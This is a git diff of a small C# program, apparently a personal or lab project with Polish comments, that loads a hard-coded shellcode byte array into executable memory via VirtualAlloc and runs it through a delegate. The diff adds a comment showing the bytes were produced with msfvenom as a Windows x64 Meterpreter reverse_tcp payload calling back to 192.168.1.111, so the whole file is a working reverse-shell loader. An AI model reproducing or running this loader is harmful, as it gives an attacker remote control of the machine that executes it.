@@ -1,10 +1,5 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
-
 namespace Brzydal
 {
     class Program
@@ -14,7 +9,6 @@ namespace Brzydal
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         delegate void Run();
-
 
         public static void Main(string[] args)
         {
@@ -44,9 +38,9 @@ namespace Brzydal
                 0x57, 0x68, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x5e, 0x5e, 0xff, 0x0c, 0x24, 0x0f, 0x85,
                 0x70, 0xff, 0xff, 0xff, 0xe9, 0x9b, 0xff, 0xff, 0xff, 0x01, 0xc3, 0x29, 0xc6, 0x75, 0xc1,
                 0xc3, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x6a, 0x00, 0x53, 0xff, 0xd5
-            }; //wygenerowano w trakcie "coś brzydkiego"
+            }; //wygenerowano w trakcie msfvenom --platform windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.111 -f csharp > brzydkie.cs
 
-            IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr) payload.Length, (IntPtr) 0x1000, (IntPtr) 0x40);
+            IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr) payload.Length, (IntPtr) 0x1000, (IntPtr) 0x40); //type i mode znalezione gdzieśtam
             Marshal.Copy(payload, 0, ptr, payload.Length);
             Run r = (Run) Marshal.GetDelegateForFunctionPointer(ptr, typeof(Run));
             r();
